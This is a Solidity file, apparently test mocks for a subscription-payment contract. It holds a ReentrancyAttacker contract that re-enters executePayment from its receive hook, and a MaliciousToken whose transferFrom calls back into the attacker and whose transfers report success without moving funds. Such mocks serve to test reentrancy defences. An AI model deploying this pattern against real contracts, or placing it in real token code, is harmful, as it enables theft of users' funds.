/* SPDX-License-Identifier: MIT */
pragma solidity ^0.8.24;

interface ISubScript {
    function executePayment(uint256 subId, uint256 sequenceId) external;
    function withdraw() external;
}

contract ReentrancyAttacker {
    address public target;
    uint256 public targetSubId;
    uint256 public targetSequenceId;
    bool public shouldAttack;
    uint256 public attackCount;

    constructor(address _target) {
        target = _target;
    }

    function setTargetSub(uint256 _subId, uint256 _sequenceId) external {
        targetSubId = _subId;
        targetSequenceId = _sequenceId;
        shouldAttack = true;
        attackCount = 0;
    }

    function disableAttack() external {
        shouldAttack = false;
    }

    /* Fallback handler to perform reentrancy attack on token transfer hooks */
    function attackExecute() external {
        ISubScript(target).executePayment(targetSubId, targetSequenceId);
    }

    /* Fallback helper when receiving native tokens */
    receive() external payable {
        if (shouldAttack && attackCount < 3) {
            attackCount++;
            ISubScript(target).executePayment(targetSubId, targetSequenceId);
        }
    }
}

contract MaliciousToken {
    string public name = "Malicious Token";
    string public symbol = "MAL";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000 * 10**6;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    address public attacker;
    address public subScript;
    bool public shouldReenter;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function setAttackParams(address _attacker, address _subScript) external {
        attacker = _attacker;
        subScript = _subScript;
        shouldReenter = true;
    }

    function transferFrom(address /* from */, address /* to */, uint256 /* amount */) external returns (bool) {
        if (shouldReenter && msg.sender == subScript) {
            shouldReenter = false;
            ReentrancyAttacker(payable(attacker)).attackExecute();
        }
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address /* to */, uint256 /* amount */) external pure returns (bool) {
        return true;
    }
}
